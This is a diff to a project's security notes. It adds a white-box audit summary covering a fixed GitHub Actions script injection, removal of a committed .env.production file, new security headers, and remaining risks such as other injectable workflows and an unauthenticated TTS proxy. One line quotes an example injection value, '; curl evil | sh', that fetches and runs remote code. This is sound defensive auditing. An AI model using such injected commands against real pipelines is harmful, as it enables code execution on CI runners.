@@ -64,3 +64,45 @@
 - مفتاح Pexels: تُحقِّق من عدم بقاء أي قيمة حرفية في الشيفرة — القراءة من
   `VITE_PEXELS_API_KEY` ثم `VITE_PEXELS_KEY`، وغيابهما يُرجع نتيجة فارغة
   (`if (!apiKey) return []`) فلا يكسر شيئاً. ووُثِّق المتغيّران في `.env.example`.
+
+---
+
+# Security audit round — 2026-09-17 (white-box hardening)
+
+## Fixed this round
+1. **GitHub Actions script injection** — `.github/workflows/podcast-soul-forge.yml`.
+   `${{ github.event.inputs.slugs | limit | batch }}` were interpolated directly
+   into the `run:` shell script. A crafted `workflow_dispatch` input (e.g.
+   `; curl evil | sh`) would execute on the runner. Fixed by passing the inputs
+   through `env:` variables and referencing them as `$SOUL_FORGE_*`, so the values
+   are no longer parsed by the shell command layer. Backwards-compatible.
+2. **`.env.production` removed from the tree + git-ignored.** Verified it held ONLY
+   public config (`VITE_FIREBASE_*` web keys, public VAPID key, site URL) — no
+   non-public secret — so it was safe to `git rm --cached` and add to `.gitignore`.
+   The Firebase Web `apiKey` is public by design (not a vuln). History NOT rewritten.
+3. **Baseline security headers added to `vercel.json`** (`X-Content-Type-Options`,
+   `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, HSTS) for the
+   Vercel-served surface. The primary Firebase host already ships these + a full CSP.
+
+## Verified safe (no change needed)
+- `server.mjs` Firebase admin auth (`verifyFirebaseAdminToken`) properly verifies
+  RS256 signature against Google JWKS, checks `aud`/`iss`/`exp`/`iat`/`auth_time`
+  and enforces `admin === true`. No decode-only bypass.
+- `canonicalRedirectLocation` only ever redirects to the fixed `canonicalHost` —
+  no open redirect.
+- No hardcoded non-public secrets found in source (only the public web apiKey).
+
+## Intentionally left (needs owner / could touch live flow)
+- Other `workflow_dispatch` inputs interpolated into `run:` across podcast/audio
+  workflows (e.g. `podcast-dialogue-final-review.yml`, `auto-audio-r2.yml`,
+  `podcast-male-finalist-retest.yml`). Lower risk: `workflow_dispatch` requires
+  repo write access. Recommended fix: same `env:` indirection pattern applied above.
+- `server.js` `/api/say` Google TTS proxy is unauthenticated (240-char cap +
+  in-memory cache). Potential cost/DoS abuse. Recommend a rate limiter / auth;
+  left to avoid affecting the live voice flow.
+- CSP not added to `vercel.json` (Firebase remains the CSP-enforcing host; adding
+  it to a secondary host without live testing risks breaking inline boot logic).
+- Prior items from earlier rounds (Pexels key rotation, git-history cleanup for
+  old secrets) still stand — owner action required.
+- Per audit guardrails: payment, notification/push, WhatsApp bridge logic and the
+  `orders`/`invoices`/`pushTokens` Firestore rules were not touched.
